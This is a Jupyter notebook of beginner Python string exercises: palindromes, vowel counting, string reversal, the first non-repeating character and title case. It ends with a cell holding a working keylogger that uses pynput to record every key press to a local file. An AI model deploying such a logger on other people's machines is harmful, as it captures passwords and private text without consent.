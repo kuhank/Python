{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "i=0\n",
    "while i != 0:\n",
    "    i=i-1\n",
    "else:\n",
    "    i=i+1\n",
    "\n",
    "# what is i value ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "it is palindrom\n"
     ]
    }
   ],
   "source": [
    "#Write a function to check if a given string is a palindrome\n",
    "def palindrom(input_str):\n",
    "    return input_str[::]==input_str[::-1]\n",
    "\n",
    "if palindrom(input(\"Enter a string\")):\n",
    "    print(\"it is palindrom\")\n",
    "else:\n",
    "    print(\"it is not palindrom\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1\n",
      "vowels count:  {'a': 1}\n",
      "consonant count:  {'l': 2, 'j': 1, 'd': 2, 'k': 1, 'c': 6, 's': 1}\n",
      "Number of vowels:  1\n",
      "Number of consonant:  13\n"
     ]
    }
   ],
   "source": [
    "# Count the number of vowels and consonants in a string.\n",
    "\n",
    "def count_vow_cons(input_Str):\n",
    "    input_str_set=set(input_Str)\n",
    "    vowels = ['a','e','i','o','u']\n",
    "    counts=0\n",
    "    dict_wowels = {}\n",
    "    consonant_dict = {}\n",
    "    for i in input_str_set:\n",
    "        if i in vowels:\n",
    "            print(input_Str.count(i))\n",
    "            counts = input_Str.count(i)\n",
    "            dict_wowels[i]=counts\n",
    "        else:\n",
    "            counts = input_Str.count(i)\n",
    "            consonant_dict[i]=counts\n",
    "    print(\"vowels count: \", dict_wowels)\n",
    "    print(\"consonant count: \", consonant_dict)\n",
    "    print(\"Number of vowels: \", sum(dict_wowels.values()))\n",
    "    print(\"Number of consonant: \", sum(consonant_dict.values()))\n",
    "\n",
    "count_vow_cons(\"daskldljcccccc\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<built-in method values of dict object at 0x000001E4A9BAA000>\n",
      "dict_values(['a', 'b'])\n"
     ]
    }
   ],
   "source": [
    "# difference betweem dict.values and dict.values()\n",
    "\n",
    "dict_sample = {1:'a', 2:'b'}\n",
    "print(dict_sample.values)\n",
    "print(dict_sample.values())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Reversed string : g afsda\n",
      "reversed string:  g afsda\n"
     ]
    }
   ],
   "source": [
    "# Reverse a string without using built-in functions.\n",
    "\n",
    "inp = \"adsfa g\"\n",
    "\n",
    "print(\"Reversed string :\", inp[::-1])\n",
    "\n",
    "print(\"reversed string: \",''.join(reversed(inp)) )\n",
    "# reversed() function takes an iterable (like a string, list, or tuple) and returns a reverse iterator"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No non-repeating charecter\n"
     ]
    }
   ],
   "source": [
    "# 4. Find the first non-repeating character in a string.\n",
    "\n",
    "from collections import Counter\n",
    "\n",
    "def charecter_count(S):\n",
    "    count_dict = Counter(S) # returns a dictionary\n",
    "    # print(count_dict)\n",
    "    for c in S:\n",
    "        if count_dict[c] == 1:\n",
    "            print(\"first non repeating charecter is: \", c)\n",
    "            return 1\n",
    "            break\n",
    "    return 0\n",
    "        \n",
    "\n",
    "if not charecter_count(\"aaaaa\"):\n",
    "    print(\"No non-repeating charecter\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Adk Flkj Ioejr Aldfkj'"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#5. Convert a given string to title case (capitalize first letter of each word).\n",
    "\n",
    "input_str= 'adk flkj ioejr aldfkj'\n",
    "captilized_Str = [' '.join(char[0].upper()+ char[1:] for char in input_str.split())]\n",
    "update_str=''.join(captilized_Str) # join() takes an iterable (like a list) and concatenates its elements into a single string.\n",
    "update_str"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#key stroke\n",
    "\n",
    "# !pip install pynput\n",
    "from pynput import keyboard\n",
    "\n",
    "def on_press(key):\n",
    "    with open(\"Keystroke.txt\",\"a\") as f:\n",
    "        try:\n",
    "            f.write(f\" {key.char} \")\n",
    "        except AttributeError:\n",
    "            f.write(f\" {key} \")\n",
    "\n",
    "with keyboard.Listener(on_press=on_press) as listener:\n",
    "    listener.join()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
